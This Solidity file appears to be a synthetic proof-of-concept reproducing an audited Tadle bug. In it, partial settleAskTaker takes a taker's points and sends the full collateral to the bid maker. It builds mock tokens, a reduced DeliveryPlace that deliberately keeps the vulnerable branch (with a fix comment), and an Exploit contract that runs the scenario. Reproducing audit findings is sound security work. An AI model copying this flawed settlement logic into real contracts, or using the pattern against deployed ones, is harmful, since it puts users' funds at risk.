// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Tadle — partial settleAskTaker takes the taker's points and pays their
    collateral to the bid maker (CodeHawks 2024-08, #38062).
    The report title says settleAskMaker. The cited line and the PoC are
    DeliveryPlace.settleAskTaker (DeliveryPlace.sol L335).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: when _settledPoints != stockInfo.points the function has
    already pulled tokenPerPoint * _settledPoints from the caller, then the
    else branch credits the FULL collateral fee to offerInfo.authority and
    nothing to the taker. settleAskTaker on PerMarkets then marks the stock
    Finished, so the taker cannot settle the remainder.

    The report's own PoC first corrects a separate authority check
    (offerInfo.authority -> stockInfo.authority) so the taker can call.
    That correction is applied here. The collateral branch is verbatim.

    Repo: Cyfrin/2024-08-tadle @ 04fd8634701697184a3f3a5558b41c109866e5f8
    Offer parameters from the report: 1000 points, collateral rate 12000,
    tokenPerPoint 0.01e18, taker stock 500 points, settle 300.
    Stock notional is 5e18 so the same 120% fee is 6e18 (the contest harness
    used amount 0.01e18, which makes that fee 6e15). Point transfer matches
    the log: 300 * 0.01e18 = 3e18, balance 100e18 -> 97e18. */

contract MockToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract BidMaker {}

enum OfferType {
    Ask,
    Bid
}

enum StockType {
    Ask,
    Bid
}

enum TokenBalanceType {
    MakerRefund,
    RemainingCash,
    PointToken
}

contract TokenManager {
    MockToken public usdc;
    MockToken public point;
    mapping(uint8 => mapping(address => mapping(address => uint256))) public userTokenBalance;

    constructor(MockToken _usdc, MockToken _point) {
        usdc = _usdc;
        point = _point;
    }

    /// Pull `amount` of `token` from `from`. Audited TokenManager.tillIn.
    function tillIn(address from, address token, uint256 amount, bool) external {
        MockToken(token).transferFrom(from, address(this), amount);
    }

    /// Credit `user` and, for the two collateral buckets, release the escrow.
    /// Point-token credits move the POINT that tillIn just pulled.
    function addTokenBalance(TokenBalanceType t, address user, address token, uint256 amount) external {
        userTokenBalance[uint8(t)][user][token] += amount;
        if (token == address(point) && t == TokenBalanceType.PointToken) {
            point.transfer(user, amount);
        }
        if (token == address(usdc) && (t == TokenBalanceType.MakerRefund || t == TokenBalanceType.RemainingCash)) {
            usdc.transfer(user, amount);
        }
    }
}

/// Reduced DeliveryPlace. The collateral branch of settleAskTaker is the audited body.
contract DeliveryPlace {
    uint256 internal constant COLLATERAL_RATE_DECIMAL_SCALER = 10_000;
    TokenManager public tokenManager;
    address public offer;
    address public stock;
    address public maker;
    address public taker;
    address public usdc;
    address public point;
    uint256 public tokenPerPoint;
    uint256 public collateralRate;
    uint256 public stockPoints;
    uint256 public stockAmount;
    uint256 public lastSettledPoints;
    uint256 public lastCollateralFee;
    bool public stockFinished;

    constructor(TokenManager _tm) {
        tokenManager = _tm;
    }

    function configure(
        address _offer,
        address _stock,
        address _maker,
        address _taker,
        address _usdc,
        address _point,
        uint256 _tokenPerPoint,
        uint256 _collateralRate,
        uint256 _stockPoints,
        uint256 _stockAmount
    ) external {
        offer = _offer;
        stock = _stock;
        maker = _maker;
        taker = _taker;
        usdc = _usdc;
        point = _point;
        tokenPerPoint = _tokenPerPoint;
        collateralRate = _collateralRate;
        stockPoints = _stockPoints;
        stockAmount = _stockAmount;
        stockFinished = false;
        lastSettledPoints = 0;
        lastCollateralFee = 0;
    }

    /// OfferLibraries.getDepositAmount for a Bid offer and a taker (isMaker = false).
    /// Bid+maker returns amount; Ask+taker returns amount; otherwise amount * rate / 10000.
    function depositAmount(OfferType offerType, uint256 rate, uint256 amount, bool isMaker) public pure returns (uint256) {
        if (offerType == OfferType.Bid && isMaker) {
            return amount;
        }
        if (offerType == OfferType.Ask && !isMaker) {
            return amount;
        }
        return (amount * rate) / COLLATERAL_RATE_DECIMAL_SCALER;
    }

    /**
     * @notice Settle ask taker
     * @dev caller must be stock authority
     * @param _stock stock address
     * @param _settledPoints settled points
     * @notice _settledPoints must be less than or equal to stock points
     */
    function settleAskTaker(address _stock, uint256 _settledPoints) external {
        require(_stock == stock, "stock");
        require(!stockFinished, "finished");
        require(_settledPoints <= stockPoints, "points");
        // Report PoC precondition: the taker (stock authority) is the caller.
        // Audited source checks offerInfo.authority, which the reporter corrected first.
        require(msg.sender == taker, "auth");

        uint256 settledPointTokenAmount = tokenPerPoint * _settledPoints;
        if (settledPointTokenAmount > 0) {
            tokenManager.tillIn(msg.sender, point, settledPointTokenAmount, true);
            tokenManager.addTokenBalance(TokenBalanceType.PointToken, maker, point, settledPointTokenAmount);
        }

        uint256 collateralFee = depositAmount(OfferType.Bid, collateralRate, stockAmount, false);

        if (_settledPoints == stockPoints) {
            tokenManager.addTokenBalance(TokenBalanceType.RemainingCash, msg.sender, usdc, collateralFee);
        } else {
            // @> VULN: partial settlement still took the taker's points, then pays the FULL collateral fee to the bid maker
            tokenManager.addTokenBalance(TokenBalanceType.MakerRefund, maker, usdc, collateralFee);
            // FIX: revert on _settledPoints != stockPoints before tillIn, so points and collateral stay with the taker
        }

        // PerMarkets.settleAskTaker marks the stock Finished even for a partial fill.
        stockFinished = true;
        lastSettledPoints = _settledPoints;
        lastCollateralFee = collateralFee;
    }
}

contract Exploit {
    MockToken public usdc; // CREATE nonce 1
    MockToken public point; // CREATE nonce 2
    TokenManager public tokenManager; // CREATE nonce 3
    DeliveryPlace public delivery; // CREATE nonce 4
    BidMaker public maker; // CREATE nonce 5

    address public constant OFFER = address(0xA11CE);
    address public constant STOCK = address(0xBEEF);

    uint256 public profit;
    uint256 public pointsBefore;
    uint256 public pointsAfter;
    uint256 public takerUsdc;
    uint256 public makerUsdc;
    uint256 public makerPoints;
    bool public secondReverted;

    constructor() {
        usdc = new MockToken("USD Coin", "USDC");
        point = new MockToken("Point", "POINT");
        tokenManager = new TokenManager(usdc, point);
        delivery = new DeliveryPlace(tokenManager);
        maker = new BidMaker();

        // Taker (this contract) starts where the report's log starts: 100 POINT.
        point.mint(address(this), 100e18);
        // Escrow of the taker's collateral. 500-point stock notional 5e18, rate 12000 -> 6e18.
        usdc.mint(address(tokenManager), 6e18);

        delivery.configure(
            OFFER,
            STOCK,
            address(maker),
            address(this),
            address(usdc),
            address(point),
            0.01e18,
            12_000,
            500,
            5e18
        );
    }

    function run() external {
        point.approve(address(tokenManager), type(uint256).max);
        pointsBefore = point.balanceOf(address(this));
        delivery.settleAskTaker(STOCK, 300);
        pointsAfter = point.balanceOf(address(this));
        takerUsdc = usdc.balanceOf(address(this));
        makerUsdc = usdc.balanceOf(address(maker));
        makerPoints = point.balanceOf(address(maker));
        require(pointsBefore == 100e18, "start");
        require(pointsAfter == 97e18, "points not taken");
        require(takerUsdc == 0, "taker was paid");
        require(makerUsdc == 6e18, "collateral not redirected");
        require(makerPoints == 3e18, "points did not reach maker");
        require(delivery.lastSettledPoints() == 300, "not the partial amount");
        require(delivery.stockFinished(), "stock still open");
        try delivery.settleAskTaker(STOCK, 200) {
            secondReverted = false;
        } catch {
            secondReverted = true;
        }
        require(secondReverted, "remainder could still settle");
        require(usdc.balanceOf(address(this)) == 0, "taker gained usdc");
        profit = makerUsdc;
    }
}
